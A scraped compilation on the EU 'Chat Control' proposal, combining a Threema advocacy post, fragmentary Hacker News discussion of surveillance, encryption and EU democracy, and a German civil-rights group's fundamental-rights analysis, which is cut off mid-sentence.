    "originBody": "With its legislative proposal known as “Chat Control,” the EU Commission is trying to establish an unprecedented mass-surveillance apparatus of Orwellian proportions in the European Union. If EU citizens don’t stand up for privacy now, it may be too late. This Wednesday, June 19, 2024, the EU Council could be voting on the controversial Chat Control bill. Should it pass, the consequences would be devastating: Under the pretext of child protection, EU citizens would no longer be able to communicate in a safe and private manner on the Internet. The European market’s location advantage would suffer a massive hit due to a substantial decrease in data security. And EU professionals like lawyers, journalists, and physicians could no longer uphold their duty to confidentiality online. All while children wouldn’t be better protected in the least bit. On the contrary, Chat Control could have a negative impact on minors in particular. What is Chat Control? The EU Commission’s proposed Child Sexual Abuse Regulation (commonly known as “Chat Control”) aims to combat the circulation of CSAM (child sexual abuse material) on digital platforms by requiring service providers to implement some sort of detection mechanism that automatically scans users’ (media) messages for both known and potential CSAM and reports detected cases to authorities. It doesn’t matter how the EU Commission is trying to sell it – as “client-side scanning,” “upload moderation,” or “AI detection” –, Chat Control is still mass surveillance. And regardless of its technical implementation, mass surveillance is always an incredibly bad idea, for a whole plethora of reasons. Here are just three: 1. Mass Surveillance is a Totalitarian Tool Incompatible with Democracy One distinguishing factor between totalitarian states and democracies is that only in the former can the government invade citizens’ privacy for no apparent reason. Modern democracies recognize privacy as a basic human right. The EU itself acknowledges it in the Charter of Fundamental Rights (article 7): Everyone has the right to respect for his or her private and family life, home and communications. Imagine, for example, the police could randomly enter your home without having any reason to believe you’re involved in illegal activities, simply to snoop around and see whether they can find something suspicious by sheer chance. In a healthy democracy, it should be the citizens who oversee the government – mass surveillance is the inversion of this democratic principle. With a measure like Chat Control, the EU would violate one of its own basic rights and put its citizens under general suspicion, thereby profoundly disrupting the trust between citizens and the government. 2. Mass Surveillance Is Ineffective Mass surveillance of standard communication channels like instant messengers only affects law-abiding citizens. Given their involvement in illegal activities, criminals will go to any length to avoid surveillance. After all, why would any criminal continue to use a communication channel that’s known to be under government surveillance? However, flying under Chat Control’s radar wouldn’t even require resorting to some other, obscure means of communication that can’t be (or isn’t yet) surveilled. Criminals could, for example, simply manually encrypt illegal content before sharing it. Ordinary, unsuspecting Internet users, for whom it wouldn’t be practical to handle day-to-day communication with friends and family members in this manner, would therefore be the only ones really affected by mass surveillance. And besides inevitable false positives (think family photos of a beach vacation), minors (i.e., the ones who should be protected) engaging in consensual “sexting” would probably amount for the vast majority of CSAM reports. 3. Mass Surveillance Undermines Data Security It’s not just citizens’ privacy that would suffer from the proposed mass surveillance. Because Chat Control essentially requires communication services to install a backdoor, it’s also citizens’ security that would take a massive hit. The reason secure communication services like Threema employ end-to-end encryption is to make sure no one except the intended recipient is able to read a message, not even the service provider. Introducing a backdoor into such a system is like adding a weak link to a strong chain lock. Sure, the government can now open the lock without a key, but so can any burglar. The negative impact a backdoor has on security can hardly be overstated. It’s not just the first place anyone would try to penetrate a system that’s otherwise secure, it’s like an API for hackers. And EU interior ministers seem to be well aware of this: why else would they themselves want to be exempt from Chat Control’s surveillance? Of course, sharing CSAM is an absolutely intolerable, horrific crime that must be punished. Before CSAM can be shared online, however, a child must have suffered abuse in real life, which is what effective child protection should be trying to prevent (and what Chat Control does not focus on). For this and many other reasons, child protection organizations such as Germany’s Federal Child Protection Association are against Chat Control, arguing that it’s “neither proportionate nor effective.” Besides, there’s no way of really knowing whether Chat Control would actually be (or remain) limited to CSAM. Once the mass-surveillance apparatus is installed, it could easily be extended to detect content other than CSAM without anyone noticing it. From a service provider’s point of view, the detection mechanism, which is created and maintained by third parties, essentially behaves like a black box. What can you do? Since the matter may be decided this Wednesday, June 19, 2024, time is a critical factor. If you’re a EU citizen, please consider contacting your government’s representative today, asking them to vote against Chat Control. It may also help to take to the digital streets, spread the word online, and raise awareness for the EU’s dubious plan to establish an unprecedented mass-surveillance apparatus that would essentially nullify the right to data privacy and set a highly dangerous precedent in doing so. What would Chat Control mean for Threema users in the EU? While Threema would be subject to Chat Control, the business solution Threema Work would be out of scope according to our current knowledge. It’s still not entirely clear how Chat Control would have to be implemented by service providers, and it’s questionable whether such a blatant violation of the right to privacy would hold up in European courts. What is crystal clear, however, is that there will never be a Threema version that’s spying on its users in any way, shape, or form. The reason Threema was created is to provide a highly secure, completely private, and anonymous means of communication. Once it’s no longer possible to offer such a service in the European Union, we will be forced to take consequences. We will carefully consider all options (including legal actions, technical workarounds, etc.) first, and if we come to the conclusion that there’s no other way, we’ll call on fellow communication services to join us in leaving the EU.",

It's likely to be abused, with many false positive that make it more effective at sweeping up innocent people, while the guilty just find workarounds. But all coming on here and saying \"ooohh, this is bad, innit!\" is not very interesting, and unlikely to prevent it. Why is the EU doing this? Which political groups are supporting and opposing it? Why now? How are vendors responding? How does it affect non-EU countries? reply henry_pulver 7 hours agoparent> But all coming on here and saying \"ooohh, this is bad, innit!\" is not very interesting, and unlikely to prevent it. I disagree - this is how the internet can strengthen democracy. Upvoting and commenting makes this post hit the top of HN and stay there. This makes it visible to many EU citizens who can reach out to their MEP's to ask them to vote against it. Seems a pretty effective strategy to me as someone living in a non-EU country. Although agree that we should also be discussing the questions you raised. reply throwaway43734 8 hours agoparentprevThere are organizations which are selling AI tools to filter content.

Before CA, the received wisdom was that if you do something bad, you will need to resign before you are pushed for causing damage to the organisation reputation and therefore electability. This was perhaps borne out with enormous error bars by focus groups and polls asking \"would you still vote for X in case of Y\". After CA, and in particular the live social media sentiment data that was gathered around the debacle of the UK Brexit referendum, the data showed that actually egregious misbehaviour did not materially affect sentiments, and perhaps even appealed to a larger proportion of people than believed. For example, the famous \"shy Tory\" might not show up well in a focus group, but it all hangs out after analysing Facebook's data. With that data in hand, people started doing things that they would never have dared to do before, knowing that it won't actually harm them, at least in the short run (since this data only shows short term effects). And that's how we go from resigning over fairly small gaffes to the \"screw it, what you gonna do, we know you won't vote for the others, we've seen your data\" of today. Not long ago, calling a woman a bigot on a hot mic was a dreadful PR disaster. Now, you can physically snatch a journalist's phone and it barely registers. It does, however stack up over time with catastrophic final effects, much like chasing only quarterly figures or always postponing dealing with technical or real debt. reply roenxi 6 hours agorootparentThere was a disjunction around the late 90s/early 2000s when the internet got big. That was around the time that the corporate news sources started losing control of the news to more citizen reporter types running podcasts or whatever gets big on social media. What gets called \"the narrative\" split from being the consensus of journalists to a cacophony of random people who don't form consensuses. Before that change, a scandal in the papers also meant you had to have lost political favour with the people who owned the media companies, ie, were losing big political battles. You also had no hope of being re-elected through a hostile media because if they didn't carry a favourable message there was no way to communicate with voters. I'd argue people like Jeffery Epstein never really made it to trial or public attention because stories got buried. Afterwards the better approach is to point and shout \"Fake News\". There are multiple channels that reach voters and it turns out that the corporate media are actually much more unreliable and unpopular than were previously suspected. A lot more dirty laundry is aired and the Streisand effect takes hold. CA wasn't the change, it was just one of the first big scandals to happen in the new era. reply gravescale 4 hours agorootparentI don't know, I think there was definitely a turn around the mid 2010s when actions and consequences really started to diverge. And to be clear, I don't mean that the exposure of CA was the cause, I mean that what CA and their ilk was delivering to their customers - detailed, real time, granular analysis of the reactions to actions. Some time a bit before the public CA exposure would have been when analysts looking at the data delivered by CA would have first realised just how little what would until then have been \"scandal\" actually moved the needle of their supporters, without having to infer from slow and inaccurate techniques like polling and focus groups. reply hoseja 8 hours agorootparentprevWe have to make the more traditional methods popular again. reply gravescale 7 hours agorootparentThe problem is that this (if my theory is not just bunk) isn't something you can really go back and do differently. An emergent property of the reactions of polarised groups to the behaviours of their leaders was discovered to be quite different to what had been assumed. You may as well say \"we have to go back to the old ways\" when lamenting the relativity makes physics too complicated. Though, as to the point I think you're actually making, it's also been made very difficult to object to these things in any terms that could possibly have an effect without being thoroughly denounced as a nutter, an extremist, or worse. After all, the \"right\" thing to do is always to simply \"vote!\". reply wickedsickeune 9 hours agoparentprevIn Greece, we recently elected as representatives for the EU Parliament: * a 71 year old lady, with no social media and no public speeches ever. * a guy who used a nickname for his last name, that matched with a military general (who is well known), and many people thought he was the general * a \"journalist\" that was caught twice talking on live TV, conversing with a pre-recorded video * a convicted criminal It's impressive to manage to fail as a politician. reply patates 9 hours agorootparentHello neighbor.

Every time I hear something about Greece, it sounds like a hot mess. reply sakisv 4 hours agorootparentI think this sums it up pretty nicely. It's a failed state with corrupt people at the top of the government. The parliament, i.e. the majority, i.e. these people, are also the ones who appoint the judges of the top courts of the country, which all but ensures their immunity. Their immunity is also enshrined in the consistution[4, article 86] - only the parliament can take an MP to the courts, but guess who controls the majority Also, they are in the pockets of the local oligarchic mafia [1]: A few families that control the vast majority of the media AND the big construction companies AND the energy companies. They are also the ones that own big part of the shipping industry in Greece. For their sake, back in 2022 when the EU was considering to ban oil shipments from Russia, Greece vetoed that [2] Oh, and just to be safe, the oligarch's tax exemptions are written in the constitution[4, article 107] So, the people in the government have an almost complete immunity from everything, which makes them extremely arrogant. If you add to that mix the total disregard of public services, even hospitals during the pandemic, you get a very beautiful-to-look-but-terrible-to-live-in failed state.

However, the problem is that she is not a politician and she has no public presense whatsoever. She was chosen by her party, and eventually elected because her last name starts with A which put her near the top of the ballot paper. reply FabHK 8 hours agorootparentOuch, that's bad! reply Semaphor 9 hours agoparentprevAlmost nothing is. Local politicians fail upwards to the EU (at least in Germany) or some private job, if they fail at all. Most of the time, you can do what you want, and the voters don’t care. reply lukan 9 hours agorootparent\"and the voters don’t care.\" Then why did so many vote extremist anti EU? There just has been EU election in germany and the nationalist gained a lot. And none of the big parties otherwise said a clear no to that, so what could I do, except vote a small party against that, but too small to really do something? Voters care. But they see often no point in voting anymore. reply Tuna-Fish 9 hours agorootparentThat's precisely the thing. Whenever EU does something people don't like, they hate EU, not the council members who voted for it. reply gillesjacobs 8 hours agorootparentBecause it is exactly the EU governance that lacks democratic representation, enabling unfavoured politicians to remain in significant power. You can only elect MEPs (via party lists) locally. The majority of legalislation is drafted by the technocratic European Commission and legislation is mostly passed through parlaiment unchanged from there. There are many nationally disgraced politicians seating in the EP, EC or council. Only the ones in the EP were electible. The people have correctly identified that a massive supranational unaccountable government is the problem, enabling corrupt people to keep ruling which undermines the core functioning of representative democracy. reply mariusor 8 hours agorootparentIn this specific case I believe that it's the EU Council that pushes for the current iteration of the law, which is formed of the head of states for each EU member. So, even if they might not be explicitly elected to be in the EU governance, most of them have reached that spot through more or less democratic means. \"More or less\" because Prime Ministers are usually nominated not elected, but that's still as part of each country's democratic process. reply raxxorraxor 6 hours agorootparentThe level of indirection is very important and you can only elect a very small part of the council. There are a lot democratic deficiencies.

Everything else is at best semi-democratic. reply iknowstuff 8 hours agorootparentprevHow is voting different from other federal states? EP frequently alters EC proposals. Council consists of heads of state, commission is appointed by council and parliament, and the parliament is directly elected. Not terribly different from how prime ministers ate appointed. reply beeboobaa3 8 hours agorootparentprevYes, this is called a representative democracy.

Home searches are done casually because the judicative branch is overworked, neglects its responsibility and just waves such demands through. You lose your electronics and maybe your property gets damaged. Of course for a developer your electronics might be quite valuable as well. With a mechanism like this, this probably will increase further, apart of course for the unjust violation of privacy and even dignity. This is a law that contradicts the constitution very directly. Also, this is policy that was not brought through democracy. It was created by European Commissioners that only have a very low democratic legitimacy for far reaching policies like this. It would be a disaster for the EU and all its citizens if this comes through and everyone will loose. reply cherryteastain 7 hours agorootparentprevWant to check how many died in Iraq, Afghanistan, Libya and Syria between 2001 and now as a direct consequence of Western military action, versus how many people the PLA killed in foreign interventions in the same period?

I genuinely do not believe it's the intended purpose (even if it is the actual outcome). The issue is that Europe is behind in tech; particularly big communication networks (aka: social networks). One key element here is that the amount of taxes paid by the Facebooks and co. is ridiculously low and their importance in the economy is getting bigger and bigger. This causes a significant risk for the future. Any attempt that we made to combat this on the technological aspect has been a complete failure. To protect its citizen, Europe uses the biggest weapon at its disposal: regulations. The point is not to impose mass surveillance, nor is it to protect the children; the point is to hurt social networks because they are perceived as a threat (real or not). Hammer them with regulations until it's almost impossible to comply, if possible by implementing conflicting ideas (protect privacy of everyone BUT check every image for child pornography !). The desired outcome is that: either the social network goes out of Europe, or decides to accept the fines, which more or less corresponds to what Europe believes should have been paid by a fair tax system.

Voluntary chatcontrol (i.e. temporary derogation of the ePrivacy directive) 2. Mandatory chatcontrol (i.e. services must scan private communication once a detection order is issued) The first version of chatcontrol is currently in effect, but it will expire in a few years. It was introduced, because social media (like facebook) was already scanning private communication to find CSAM and then someone pointed out that this is illegal in the EU and thus the ePrivacy directive was sabotaged to allow the scanning of private communication. Facebook wanted to have a legal basis for the scanning of private communication.

I think you are 100% right that above-the-law communication is not good for society. This should be obvious. At the same time, allowing government to be able to spy everywhere is also not good for society. Also obvious. The correct solution is therefore something in the middle. I'm not convinced by the other arguments here that usually contains a hint of slippery-slope, what-aboutism or false dichotomy fallacies. The proposed legislation is terrible: it is not balanced and does not contain any safeguard to avoid abuse. However, it does not mean that the equally terrible situation of having easy way for criminals to avoid justice is the good solution either. Personally, I think that a good system should be a distributed system where several independent justice organizations share the set of key needed to decrypt (for example, a message can be decrypted only if Amnesty International, Interpol and the Austrian Justice Department put their 3 keys together, each individual key being useless on its own). In this model, abuses are almost impossible while obvious crime can still be investigated. I don't know any argument that really works to say that this model is not always better than the free-for-all-all-anonymised-messaging.

I am not saying \"the good argument is moderation\" (argument to moderation fallacy), I'm saying \"the two extremes are obviously wrong, and, it turns out, the middle is smarter\".

I don't do that, I find the good answer and I just state that it happens to be in the middle. I guess you are also doing a fallacy: \"every solution that are in the middle is wrong because it can only be the result of the argument to moderation\".

First, I'm not saying that we should not stop this legislation. I'm just answering to a comment saying \"and then what\", which is a discussion that we are, I hope, allowed to have. But secondly, a very good way to stop this legislation is by proposing something that checks all the boxes used to justify this legislation while having way better safeguard. What is your strategy? To say to people that are worried \"yeah, well, too bad for you\". Or to say \"oh, I understand your point, why not this solution, which do what you want, and also avoid what I'm afraid of\". Of course, we both know that one reason this legislation exists is because government want to spy on us. But if we propose something that satisfies all their justifications, they will have to either drop the pretends and openly admit that want to spy (and lose the support of people who are worried), or accept the solution where they cannot spy. > There’s no such thing as keys that only good guys have access to. It has been shown time and again that someone with access will abuse it or be tricked. This argument is a footgun: if indeed you cannot trust no-one, then EVERY online communication is already compromised. Your phone is full of spyware, even when you choose the most trustworthy one (because your point is that they don't exist), your softwares and servers are full of back doors, your internet provider and all your VPN are recording your communication, and even if you manage to get through all that, your interlocutor will not (and your interlocutor themselves is not a good guy). But then, I'm not saying everyone is a good guy, I'm saying that if we share DIFFERENT keys, each key being different and necessary to decrypt (think of a door having several different locks needed different keys), the probability that ALL THE GUYS are bad guys is exponentially low. If the probability of them being a bad guy or being tricked is 10%, then the probability that a 2-key system is failing is 1%, the probability that a 3-key system is failing is 0.1%, the probability that a 4-key system is failing is 0.01%, ... > But again, that’s a conversation that matters later.

So, the \"therefore\" does not imply \"it is because it is the middle\", so, no, the \"therefore\" does not imply I've chosen the middle simply because it is the middle. The \"therefore\" simply means that if I've explored different options and they are bad, it would be clever to consider another one.

The correct solution should be something in the middle. Old-fashioned wiretapping, with a warrant and the need to dedicate staff to installing and monitoring the tap is basically okay. The problem is that the mathematics of cryptography and the scaling inherent to information technology mean that only all-or-nothing solutions are possible. If the cryptography is intentionally broken, it's broken not just for law enforcement, it's broken for everyone. If law enforcement has a backdoor they can use with a warrant, they're capable of using it without a warrant, and probably will. And if their special keys get leaked, then again, the encryption is broken for everyone. Like you point out, secret sharing is one way of getting around this in principle. But governments would never make their access dependent on an NGO; in practice I'm sure they'd only agree to secret sharing schemes where the separate parties were separated only by nominal bureaucratic firewalls, and then you're back to the original problem. reply cauch 3 hours agorootparentIt's not up to governments to agree. Right now, there are encrypted communication solutions that exist. None of them have been built by a government. We can build Chaum's network and start to use it. If we do that, government will have to either accept this network as a legal usage, or admit that they don't care about kids and crimes but just want to spy. And sure, some government will admit that, but it's not by chance that right now the bad legislation are justified by \"for the children\" instead of \"because we want to spy on you\": admitting that will make these legislation obviously harmful, and they will be stopped even more easily. There are some reasons why a network like the one proposed by Chaum is not used. One is that it's not easy to put in place, similarly to how difficult it was to build ethical journalism network for example. A second one is that some people don't want such network, either because they want to do illegal things or they want to spy on citizen.

It's the same with encryption - (open-source) tools with e2ee are already broadly available, sideloading is available - nothing will stop terrorists/other criminals to just install that and continue doing what they want. On the other hand this chat control opens a huge area of opportunities for govts to spy on citizens or maybe journalists/other politicians that they dislike. And this is if we assume the system doesn't have bugs that would allow third parties/hackers to break it and get all the info by themselves, or bugs that can trigger a false-positive event.

In the aftermath of Brexit I remember reading time and again of people who voted to leave and by doing so screwed up their own business (e.g. florists whose flowers come from abroad). They expressed nothing but regret. So no, the UK didn’t vote leave because they “hate the unelected, undemocratic, wannabe-communist institutions”, they voted leave because they didn’t understand the big picture and were tricked by unscrupulous politicians making false claims (probably the most famous being that a lot more money would go into the national heath service). reply taylorius 6 hours agorootparentI could say the same thing to you. You don't get to define \"we\" any more than I do. In fact my use of the collective \"we\" was directed primarily towards the claim of xenophobia - which definitely WAS an accusation thrown at people who supported Brexit. The thrust of my point was to single out the political ruling class in the EU for their refusal to listen to the opinion of their subjects. (I can't call them constituents, as that would imply some sort of representative democracy was taking place). \"So no, the UK didn’t vote leave because they “hate the unelected, undemocratic, wannabe-communist institutions”,\" Yes they very definitely did.

There is no chat control in EU yet and there will not probably be one as envisioned by the gloomiest commentators, regardless on how the voting will go. 1 - online child abuse it's real, yes, it can be used as a pretext to sponsor unpopular laws, but it exists and can't be dismissed only as a false claim or something politicians bring up for their evil plan of global dominance and massive surveillance (last sentence is the rhetorical equivalent of What about the children?) 2 - political groups laser focusing on how the World will end if the EU discuss about some issue that has privacy implications aren't in any way better than those laser focusing on childrens' safety. 3 - the elected representatives are elected by the people of EU through a pure proportional electoral system, they represent the Europeans in almost perfect proportion to the population. The issues they are focused on are the issues that people of EU care about, we might not like the opinions and/or the acts of the majority, but it's how democracy work. 4 - the parliament is not new, the new elected representatives are still forming the new political groups (starting from today) so, no, there's no evil puppet master behind the regular schedule of the parliament 5 - issues like this one have been discussed in Europe for 15 years at least, it's nothing new, but every time there is someone predicting the end of the World as we know it. Why? it's simple: it's their job, they've been elected by a tiny minority, have little or no space compared to the larger political groups, so they need to be very local about it and use the sharpest tool of them all: fear. It's political marketing 101, nothing to see here, please disperse naked gun's style. In this case threema makes, not surprisingly, a chat app. 6 - Moreover, in November 2023 the parliament sided with encryption, by not approving the proposal to break E2E encryption while in March this year (2024) The European Court of Human Rights ruled that weakening encryption can violate fundamentals human rights (link to the sentence: https://hudoc.echr.coe.int/eng/#{%22itemid%22:[%22001-230854...}). Democracy also means trusting the system, even when it seems that everything is lost. 7 - the law hasn't passed yet and the voting will probably be delayed again, due to the aforementioned parliament still not actually in place at full steam. 8 - if being European taught me something is that approving a law is one thing, enforcing it is a complete different story. In many countries, like mine, Italy, law enforcement is a farce, especially when it's about regulatory infringements. Last but not least, laws protecting children have already been abused here in Italy (and I'm sure everywhere else) long before internet was a thing or without using any form of chat control just for political gain. A couple of examples (sorry, Italian only) https://it.wikipedia.org/wiki/Diavoli_della_Bassa_modenese https://www.ilpost.it/2023/06/08/caso-bibbiano/ the second one has been so controversial (and the accusations in such bad faith) that the equivalent Wikipedia page has been removed and locked by the admins https://it.wikipedia.org/wiki/Angeli_e_demoni_(inchiesta). reply sprash 8 hours agoprev\"Chat Control\" is already real.

But they can choose when the announcement comes out. Then along comes September 11th 2001, planes crash into the twin towers, and while the towers are still burning government PR teams are rushing out the announcement that they've badly missed their train punctuality targets. They know the news and social media are going to be full of the big event for days or weeks. By the time things are quiet enough that the newspapers have space to report on train punctuality, the bad figures are old news. This works equally well with big good-news stories like royal weddings and big sporting events. The \"good day to bury bad news\" quote is interesting because someone leaked an e-mail where a government PR boss literally encouraged it.

There's a section about penalties and fines, up to 6% of global revenue, if the provider doesn't take abuse seriously.

Those against are arguing for abstracts, like freedom and privacy. And sure, people should be in favour of those things - but there's a visceral pitch against, and it's not being used What will happen if this stuff is put in place, and used as claimed? There will be a massive rush of automated \"accusations\" of child abuse against innocent parents, grandparents, and other relatives. This will result in many families being unnecessarily stressed and disrupted by investigations, and at least some children being removed from innocent families. Why will this happen? after all, won't the scanning be 100% accurate? Obviously not. Tech companies don't want to be responsible for this - the scanning won't be optimised for accuracy, it will be optimised to pass the buck as hard as possible[1], because the tech companies don't want to business of taking the blame when some pedophile isn't caught. Who is the second level of review? Maybe some minimum wage zero-hours subcontractor at Serco or Group 4 Security, or whoever the equivalent of that is in the EU. But that's probably it - once the image has been labelled 'bad' no-one else will want to look at it. So, even if you are sending a picture of your own child to your own mother, you will have at the very least to have to think about whether it could be mistaken for child abuse by someone you don't know who has about 5 seconds to look at it and is probably from a completely different culture.

Why not castrate the offender have two strikes or even one? I am sure there are other biological reasons for this to happen but I got the impression a lot of abusers were abused as children. Because castrating people as punishment ‘because’ they were abused as children doesn’t feel right? Of course, doing that as part of treatment could in extreme situations be justified, but luckily there’s ‘reversible castration’ (https://en.wikipedia.org/wiki/Chemical_castration), and that (of course) is preferred as treatment, if such harsh measures are required. reply amelius 6 hours agoparentprevBecause we don't live in the middle ages and have human right laws. https://en.wikipedia.org/wiki/Bodily_integrity reply infecto 5 hours agorootparentSuch a dismissing statement without any meat.

However I have an unpopular opinion, interested to hear what others might think: We should eliminate anonymity online. If you go on the internet everything you do should be tied back to your name. This can be done using device attestation. Everyone gets a private key tied to their name/address. This is compatible with free speech. In fact it promotes free speech because being a \"troll\" becomes a lot more personal. I think this way of living would be closer to our nature as tribal primates. It would improve behaviour and overall quality of life. Our brains are designed to have checks and balances from wider society which you don't get anonymously online. This would also reduce the need for govt monitoring because any chat online could be \"turned in\" by an informer and then any criminals identified. reply mardifoufs 3 hours agoparentThe difference is that they aren't using this to make online conversations more polite or something (not that I agree with your point that removing anonymity somehow is better for free speech, at all). This isn't some sort of initiative to promote self policing. It's to get information that will allow authorities to arrest people and put them in jail. That automatically makes the entire argument that it could be beneficial for free speech and promote more \"real life\" like interactions online irrelevant, because that's not the point of this law. reply cherryteastain 7 hours agoparentprevWhat technological measures do you propose to block Tor and VPN services to achieve this?

    "originBody": "© John Schnobrich Freedom in the digital age Art. 5, 10 Chat control: incompatible with fundamental rights The Chat Control regulations aims to combat sexual violence against children. In this blog post we explain why the draft is a threat to fundamental rights. Become a supporting member today The EU Commission has presented a draft regulation that is to lay down rules for preventing and combating sexual violence against children (Chat Control Regulation). The planned regulation raises such significant fundamental rights concerns that the GFF is joining the debate while the draft is still being deliberated at EU level. The most important points of criticism at a glance. Table of contents Chat control violates the right to privacy Threat of chilling effects for communication freedoms De facto filtering obligations for hosting providers without safeguards Website blocking obligations require surveillance of Internet users Age verification endangers freedom of communication External Content from YouTube Please see the privacy policy of YouTube if you are loading external content. Load content Felix Reda explains the five biggest threats for our fundamental rights The EU Commission's draft regulation on chat control is currently being negotiated in the European Parliament and the Council of Ministers. With the fight against sexual violence against children, the draft pursues an objective that is essential for the protection of children and their rights and can justify restrictions of fundamental rights. However, there are considerable doubts about the effectiveness of the proposed measures. We are convinced that the draft violates the EU Charter of Fundamental Rights in crucial points. We have summarised the five most important fundamental rights objections to the chat control proposal here. Chat control violates the right to privacy The EU Commission's proposal provides for a whole range of obligations for certain online services such as internet access providers, app stores, hosting platforms and interpersonal communications services. Interpersonal communications services are, for example, email services such as GMail or instant messaging services such as WhatsApp. The term “chat control\" is often used colloquially to refer to the EU Commission’s draft regulation as a whole. Chat control in the narrower sense is the part of the draft according to which authorities can oblige providers of communications services such as WhatsApp to monitor private communications. This is a particularly serious restriction on the right to privacy and the protection of personal data (Art. 7 and 8 of the EU Charter of Fundamental Rights): The monitoring is not limited to persons specifically suspected of having committed a crime. Additionally, unlike data retention, which is also incompatible with the Charter but is limited to metadata – i.e. information about who communicated with whom at what time – chat control includes the surveillance of the contents of private messages. Authorities can impose so-called \"detection orders\" against providers of interpersonal communications services. This means that authorities can, for example, oblige messenger services to monitor the communications of all their users. It is sufficient that the authority has identified a significant risk that the service in question is being used for the dissemination of depictions of sexual violence against children. Detection orders do not have to be limited to monitoring the communications of specific users who are under suspicion. Instead, authorities can order that the content of all communications of all users of the service be monitored preventively. This is therefore a form of mass surveillance without probable cause. Such a detection order can oblige service providers to filter content for known as well as unknown depictions of sexual violence against children. In addition, they can include an obligation to detect attempts by adults to solicit minors (grooming). Content detected in this way must be forwarded by the service providers to a newly created EU centre, which will pass the information on to the law enforcement authorities of the member states after a plausibility check. Although service providers are free to choose which technologies they use to comply with the detection order, these technologies must in any case be able to analyse the contents of communications. In order to detect known depictions of sexual violence against children, an automated comparison of sent media files with a reference database may be sufficient. To detect unknown depictions of sexual violence and grooming, machine learning must be used to analyse the semantic content of chats. These methods are particularly prone to error: they only make an assumption about the meaning of the content based on patterns in the analysed communication - without actually understanding the content or the context of the conversation. In its case law on data retention, the European Court of Justice has indicated that indiscriminate mass surveillance of the contents of communications would violate the essence of the right to privacy. Indiscriminate mass surveillance is incompatible with the fundamental rights to privacy and data protection under the EU Charter, whether it involves encrypted or unencrypted communications. At the centre of public criticism of chat control, however, is the fact that the draft regulation does not exempt end-to-end encrypted communication services from detection orders. These services ensure that only the people involved in a private conversation can read the communication content – neither the service provider nor third parties can decrypt it. More and more people are specifically choosing end-to-end encrypted messengers to protect themselves. If the provider of such a messenger receives a detection order, it cannot reject it on the grounds that the service provider cannot access the contents of its users’ communications. The EU Commission's draft pays lip service to the importance of end-to-end encryption. However, service providers may only choose between technologies that allow them to detect illegal content in private communications, it states. In other words, service providers who offer end-to-end encryption without backdoors will not be able to implement any detection orders they may receive from authorities and thus come into conflict with the law. This attack on end-to-end encryption increases the intensity of the restriction of fundamental rights caused by indiscriminate mass surveillance. Threat of chilling effects for communication freedoms The European Court of Justice has already warned on several occasions that indiscriminate mass surveillance has an indirect negative impact on freedom of expression (Article 11 of the EU Charter of Fundamental Rights): communication participants are prevented from freely expressing their opinions if they cannot be sure of the confidentiality of their communications. This particularly affects professional secrecy holders, such as journalists communicating with their sources, whistleblowers and opposition activists. This danger will be exacerbated if the Chat Control Regulation, as proposed by the EU Commission, attacks the end-to-end encryption of messenger services. The aforementioned groups of people use such messengers for good reason. If this possibility is taken away from them because service providers have to weaken end-to-end encryption, considerable \"chilling effects\", i.e. a deterrent effect for the exercise of the fundamental right to freedom of expression and information, can be expected. This effect occurs regardless of whether service providers monitor the contents of private communications through a backdoor in the encryption technology or by scanning the content on the user's device before it is encrypted (client-side scanning). The communication participants expect their communication to remain confidential from the moment when they enter a message into the chat programme on their mobile phone – not only at the moment when this message is delivered to its addressee. The decisive factor is that the expectation of confidentiality and integrity of the communication process is shaken to such an extent that those affected feel compelled to restrict the exercise of their freedom of communication themselves. De facto filtering obligations for hosting providers without safeguards Public criticism of the proposal has concentrated on the phrase “chat control”, which highlights the planned obligations on messengers to scan private chats. But the planned obligations for hosting services that store third-party content on behalf of their users do not stand up to fundamental rights scrutiny either. Hosting services include those that make third-party content publicly available (platforms such as YouTube, hosting services of public websites) as well as those that offer their customers private cloud storage (Dropbox, iCloud Drive). They also include services where content is only accessible to a certain closed group of people (private accounts on Twitter, closed groups on Facebook, hosting providers of company websites with restricted access). Insofar as the planned obligations for hosting providers relate to non-public content, the threats to privacy and freedom of expression described under 1. and 2. are also relevant for hosting services. In addition, there are specific problems: many of the envisaged procedural fundamental rights safeguards for detection orders may end up being evaded entirely in the case of hosting services. This is due to the different privacy rules for communications on messengers on the one hand and hosting services on the other. Hosting services (including private cloud storage providers such as Google Drive or Dropbox) can not only be required to scan private content under the Chat Control Regulation, they may also scan content voluntarily. The Chat Control Regulation stipulates that all service providers must first carry out their own risk analysis as to whether their services pose a risk of being abused for sexual violence against children. Only if, in the view of the authorities, a service provider responds to this risk analysis with insufficient voluntary measures will they impose a detection order. In the context of these self-selected measures, hosting service providers may resort to error-prone filters to monitor private user uploads. In this scenario, there is no public scrutiny of the impact of such measures on the fundamental rights of users. In this respect, hosting services differ from messenger services: Messenger and email programmes such as Whatsapp, Signal or ProtonMail fall under the e-Privacy Directive, which in principle prohibits these service providers from monitoring the private communication content of their users. A temporary derogation from this prohibition, which itself raises serious fundamental rights concerns, is to be replaced by the Chat Control Regulation. After the Chat Control Regulation comes into force, messengers and email service providers may only access the contets of private communications on the basis of a detection order. For hosting providers such as private cloud storage, on the other hand, the e-Privacy Directive with its ban on monitoring private communications does not apply. For hosting providers, it will regularly be attractive to avoid a looming detection order through \"voluntary\" measures. In this way, the companies retain more control – also over the costs. There is a strong incentive to avoid costly measures to protect users' fundamental rights. A likely scenario, then, is that hosting services will 'voluntarily' deploy error-prone filtering programmes without the procedural safeguards foreseen for authorities’ detection orders. Before imposing a detection order, an authority must weigh the risk posed by the service against the interference with the users' fundamental rights. In this regard, the European Court of Justice has set narrow limits for the mandatory use of filtering systems. These are only compatible with the prohibition of general monitoring obligations if the filters function so faultlessly that the service providers do not have to perform an \"independent assessment of the content\" in order to rule out false positives. At least in the case of unknown depictions of sexual violence against children and grooming, the filter systems are incapable of meeting the Court’s standards. If a hosting service \"voluntarily\" filters content as part of its duty to minimise risk, there is no public assessment of whether the filtering systems are compatible with users’ fundamental rights. As a result, innocent users may inadvertently locked out of their accounts or even falsely reported to law enforcement authorities. Website blocking obligations require surveillance of Internet users The draft regulation provides for blocking obligations on internet access providers relating to individual websites (URLs). Before an authority issues a blocking order, it must require internet access providers to provide the authority with information about users' access to the URL in question. To be able to collect the necessary information about the access to individual URLs and pass it on to the authorities, internet access providers would have to monitor the surfing behaviour of all their customers preventively and comprehensively. However, such surveillance would be incompatible with the prohibition on general monitoring obligations and with the fundamental right to privacy. Additionally, this information is technically inaccessible to the internet access providers if the URL is encrypted using the https protocol. Almost all websites now use https to ensure that, for example, address or credit card data that users enter into web forms is transmitted in encrypted form. The widespread use of https is recommended by the Federal Office for Information Security. The targeted blocking of individual URLs is equally impossible for internet access providers without 